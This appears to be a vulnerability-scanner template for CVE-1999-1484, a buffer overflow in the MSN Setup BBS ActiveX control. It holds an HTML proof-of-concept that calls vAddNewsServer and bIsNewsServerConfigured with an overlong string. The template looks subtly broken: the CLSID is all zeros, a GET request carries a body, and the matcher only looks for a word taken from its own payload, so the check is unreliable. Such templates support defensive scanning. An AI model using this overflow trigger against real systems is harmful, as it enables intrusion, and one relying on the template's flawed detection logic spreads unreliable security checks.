[info]
author = "ave"
description = "MSN Setup BBS 4.71.0.10 ActiveX 控件 setupbbs.ocx 缓冲区溢出漏洞 PoC，通过嵌入该控件并调用 vAddNewsServer/bIsNewsServerConfigured 方法传入超长参数触发溢出"
id = "POC-AVE-1999-1909"
name = "CVE-1999-1484 PoC"
severity = "high"
tags = [
    "cve-1999-1484",
    "activex",
    "buffer-overflow",
]
vuln_id = [
    "CVE-1999-1484",
    "AVE-1999-1909",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = """<html><body><object classid="clsid:00000000-0000-0000-0000-000000000000" id="bbs"></object><script>var s='A';while(s.length<1000)s+='A';bbs.vAddNewsServer(s);bbs.bIsNewsServerConfigured(s);</script></body></html>"""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["vAddNewsServer"]
